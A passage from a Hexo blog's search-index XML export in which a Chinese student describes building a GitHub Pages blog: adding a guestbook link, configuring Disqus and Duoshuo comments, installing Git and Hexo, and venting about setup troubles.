    <content type="text"><![CDATA[在添加留言板时意外收获到了我想要的外部链接，但不知道适不适用与除主页上的menu以外的地方。假设一个场景，就是你要在主页上的某个地方添加一个超链接，使点击事件发生后跳到另外一个界面，设置如下： 先找到themes目录下的_config.yml这个文件打开，这个文件是themes设置文件，你可以在里面设置themes属性 这里面有layout布局，比如menu,content,sidebar等设置，我的留言板是在menu里面的，所以我在menu里面添加了这行代码：1Guestbook: /guestbook 解释一下，Guestbook是在Header的menu中显示，效果如下 后面的guestbook是在你博客主目录下的source中的一个界面名字。ok，就这样就ok了。]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo评论框部署]]></title>
    <url>%2F2016%2F05%2F23%2Fduoshuo%2F</url>
    <content type="text"><![CDATA[这几天我被一个问题缠了很久，一直没解决，到现在算是有点清楚了，所以来写个博文记录一下。hexo本身是有默认的评论框的disqus，个人感觉这个评论框风格很好，其实我想用来着，不过想想国内要翻墙，很麻烦，所以很委屈的选择了多说，不是说多说不好，自己个人比较喜欢disqus。废话不多说，来看看我折腾的过程吧。 配置disqus评论框我强烈推荐有条件的人选择disqus，而且由于是默认的评论框，很简单，你先去注册一个disqus账号，然后获取你的disqus_shortname,接着你要找到你的博客主目录下的_config.yml文件，这个文件是设置你的整个博客的配置的。然后找到如下代码 12345678# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: landscape# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: 在theme： landscape下面添加如下代码 12# Disqusdisqus_shortname: your short_name 然后保存就可以了，如果不行，在网上搜一下吧，反正我的是可以的 配置duoshuo评论框这个可能对于一点没接触过html，javascript和markdown的人来说是很痛苦的事情，因为你看不懂代码，然后网上有些博主写得很简洁，就看不懂了，我也是，所以我就一直抱着看呀看，看呀看，觉果懂了那么一点。首先也是要去多说网站注册一个账号，然后获取你的short_name,然后还是在上面说的那个文件中将刚刚要插入的代码改成 12# Duoshuoduoshuo_shortname: your short_name 然后找到这个文件：themes/你的博客所用主题/layout/_partial/article.ejs, 打开它。然后你可以疯了，因为当时我很难看懂里面代码什么意思，不过别放弃，慢慢找代码，找到 1234&lt;footer&gt;........&lt;/footer&gt; 这个小框架，然后不管你看到了什么，都把它改成下列代码 1234567&lt;footer class="article-footer"&gt; &lt;a data-url="&lt;%- post.permalink %&gt;" data-id="&lt;%= post._id %&gt;" class="article-share-link"&gt;&lt;%= __('share') %&gt;&lt;/a&gt; &lt;% if (post.comments &amp;&amp; theme.duoshuo_shortname)&#123; %&gt; &lt;a href="&lt;%- post.permalink %&gt;#disqus_thread" class="article-comment-link"&gt;&lt;%= __('comment') %&gt;&lt;/a&gt; &lt;% &#125; %&gt; &lt;%- partial('post/tag') %&gt; &lt;/footer&gt; 然后在这个文件最后将你在多说网站上获取的代码复制粘贴好，不过没完，你需要完善，完善什么呢，你会看到其中有些值需要你去填写。这个过程可以在网上找一下，因为看不懂，如果你自己打代码，会出现一些小细节的语法错误，最后完善了就像下面一样 123456789101112131415161718&lt;% if (!index &amp;&amp; post.comments &amp;&amp; theme.duoshuo_shortname)&#123; %&gt;&lt;section id="comment"&gt;&lt;div class="ds-thread" data-thread-key=&lt;%= page.path %&gt; data-title=&lt;%= page.title %&gt; data-url=&lt;%= page.permalink %&gt;&gt;&lt;/div&gt;&lt;!-- 多说评论框 end --&gt;&lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt;&lt;script type="text/javascript"&gt;var duoshuoQuery = &#123;short_name:"your shortnsme"&#125;; (function() &#123; var ds = document.createElement('script'); ds.type = 'text/javascript';ds.async = true; ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js'; ds.charset = 'UTF-8'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds); &#125;)(); &lt;/script&gt; &lt;/section&gt; &lt;%&#125;%&gt; 随便解释一下，第一行是条件语句，大概意思是主页上的文章不显示评论，要点击评论后才显示评论，接下来的代码就是评论框的实现方法。修改完了，现在可以保存了，然后部署到你的github page上，如果你能看到效果，没有什么问题，那么恭喜你，你太幸运了。反正对于一开始连代码都看不懂的我来说出现了好多问题，现在想来都觉得，明明很简单的事情，我却踩了好多坑。 附文之前说的那个comment小bug让我知道了另外一个东西，就是每篇博文下的comment,share是怎么实现的。下附网址：https://astronautweb.co/snippet/font-awesome/怎么使用别问我，自己慢慢摸索吧，着个人感觉是个好东西。]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>disqus</tag>
        <tag>duoshuo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[发个牢骚]]></title>
    <url>%2F2016%2F05%2F22%2Fmy-note2%2F</url>
    <content type="text"><![CDATA[今天不知道一不小心把那个代码改了，直接导致每篇博文下面的comment前面的图标不见了。室友说这点小细节不要在意，然而对于我这种患强迫症的人来说就是烦，想着去改，结果没改好，导致我的留言板也没做好。所以今天整个人都不好了。。。。最后决定以补补高数算了，晚上慢慢再找找这个小bug.]]></content>
  </entry>
  <entry>
    <title><![CDATA[搭建博客的大致流程]]></title>
    <url>%2F2016%2F05%2F22%2Fblog%2F</url>
    <content type="text"><![CDATA[本想着是不是拿英文来写这个流程来锻炼一下自己的英文水平，不过想了想就不装B了，英语就拿磋样还拿出来献丑。言归正传，我以为可以在寝室大神的引导下我能快一点搭好my blog，不过是我想得太简单。经过自己踩了无数坑过后总结大概过程，具体过程网上一搜一大把，不过建议别用百度搜这种东西，能翻墙就翻墙吧。大概过程如下： 安装前环境准备git+node+hexo 安装git如果是windows，下个git bash，然后跟着网上的教程自己走一遍配置过程如果是linux,直接在终端输入代码 1$ sudo apt-get install git 如果不行可能是系统没有这个安装包吧，如果上面命令不能安装，自己想办法吧，比如好像可以从github上clone一个包来安装吧，这些可以自己摸索的，我当时就慢慢摸索下来的，相信你也可以。 安装sublime text说真的，这就是个编辑器，什么都可以写，可以安很多插件，可以拿它编代码，亲试还不错。不像其他编译器比如VS，eclipse那么复杂,语法高亮和语法提示，自动补全这些功能可以通过安插件实现。忘了说安装命令了 1$ sudo apt-get install sublime 如果安不了问google或baidu,因为我也忘了是不是这个了，反正我安的时候试了类似的命令就ok了。 Github如果你是技术屌丝，这个可以有，而且有很多人在用。讲道理，这不是安装什么，就是去一个网站https://github.com注册一个账号，然后把Github Pages这个东西启用，具体过程google,baidu一大把，累了不想写 然后windows用git bash，linux用终端设置你的用户名密码 12$ git config --global user.name "your_name"$ git config --global user.email "your_email" 安装node这个没什么难的，不会自己多问，之间估计会遇到有node install, npm install什么的。 安装hexo说实话，这一步我走得很艰难，真的很艰难，到现在我都不想再去弄第二次。最开始我在虚拟机linux系统里面弄，没成功，直接导致我转向windows的git bash，具体怎么弄，请放过我，不过我可以回忆一下 安装 12$ npm install -g hexo$ hexo --version 如果出现版本号，就恭喜你了，安好了。 初始化新建一个目录，然后cd到那个目录，然后初始化hexo到那个目录。 123$ mkdir hexo$ cd hexo$ hexo init 然后干嘛呢，我想想。。。。。。 生成静态页面cd到你init的目录(这是必须的，请注意)，执行下面的命令，生成静态页面 1$ hexo g 在本地启动执行下面命令，然后打开浏览器输入http://localhost:4000进行预览 1$ hexo s 如果能行，就恭喜你了，要完了。。。。。。不过现在很晚了我要睡了，明天再更。。。。。。 还没写完，继续吧，好像最后只有一步了，不知道昨天怎么没写完，最后只需要执行以下代码： 1$ hexo d 然后根据提示输入你的github的username和password就ok了，然后就去你自己的博客看看效果吧]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git install and setting]]></title>
    <url>%2F2016%2F05%2F21%2Fgit-install%2F</url>
    <content type="text"><![CDATA[git install and setting:123$ git config --global user.name "name"$ git config --global user.email "email"$ git config --global color.ui auto and then create a new directory as tutorial123$ mkdir tutorial$ cd tutorial$ git init then create a new file as text.txt123456$ git status$ git add text.txt$ git status$ git commit -m "text"$ git status$ git log next to rename the “https://…….” as origin123$ git remote add origin https://.........(do this only the first time)$ git push -u origin master(the first time)$ git push -u origin(do this the next time) do clone1$ git clone https://....... tutorial2(a new directory) do pull file in your date-base12$ git pull origin master$ git log finally do another setting to make it better,but I meet a problem.So I stop it temporarily,continue it if I have time.]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[吐槽]]></title>
    <url>%2F2016%2F05%2F21%2Fmy-note1%2F</url>
    <content type="text"><![CDATA[我必须来吐槽一下，搞了两天了来搭建自己的博客，然而出现各种莫名其妙的东西，让我很是难受，我已经合理怀疑自己的智商了。不过话说回来上次在网上瞎做了一个智商测试，测试出来我居然有143的天才智商，真的假的。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2016%2F05%2F20%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.## Quick Start### Create a new post1$ hexo new "My New Post"More info: Writing### Run server1$ hexo serverMore info: Server### Generate static files1$ hexo generateMore info: Generating### Deploy to remote sites1$ hexo deployMore info: Deployment]]></content>
  </entry>
</search>
